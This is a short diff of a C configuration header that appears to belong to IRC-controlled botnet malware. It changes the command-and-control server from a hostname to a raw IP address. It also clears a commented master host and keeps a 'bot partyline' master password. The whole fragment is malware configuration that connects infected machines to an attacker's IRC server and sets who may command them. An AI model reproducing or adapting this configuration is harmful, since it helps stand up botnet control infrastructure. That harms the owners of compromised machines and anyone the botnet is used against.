@@ -8,7 +8,7 @@
 /* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
 /* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
 /* HAVE AN MODDED PROTOCOL IRCD!!!                       */
-#define irc_servers  "giggles.ny.chatfreedom.us:6667"
+#define irc_servers  "108.61.128.39:6667"
 #define passproto    "PASS"
 #define irc_passwd   ""
 /* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
@@ -26,7 +26,7 @@
 #define irc_chankey   ""
 
 /* MASTER HOSTNAME WILL BE ABLE TO PERFORM AUTHENTICATION */
-/* #define master_host     "@147.32.83.232"*/
+/* #define master_host     ""*/
 #define master_host     ""
 /* MASTER PASSWORD AUTHENTICATION (BOT PARTYLINE) */
 #define master_password "test1234"
